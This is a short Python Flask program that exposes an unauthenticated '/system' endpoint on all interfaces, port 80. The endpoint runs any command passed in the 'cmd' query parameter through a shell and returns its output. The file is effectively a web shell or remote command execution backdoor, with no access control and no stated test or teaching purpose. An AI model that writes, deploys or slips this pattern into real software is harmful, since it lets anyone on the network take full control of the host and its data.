from flask import Flask, request, jsonify
import subprocess

app = Flask(__name__)

@app.route('/system', methods=['GET'])
def run_command():
    cmd = request.args.get('cmd')
    if not cmd:
        return jsonify({"error": "No command provided"}), 400

    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return jsonify({
            "command": cmd,
            "output": result.stdout,
            "error": result.stderr,
            "returncode": result.returncode
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=80)
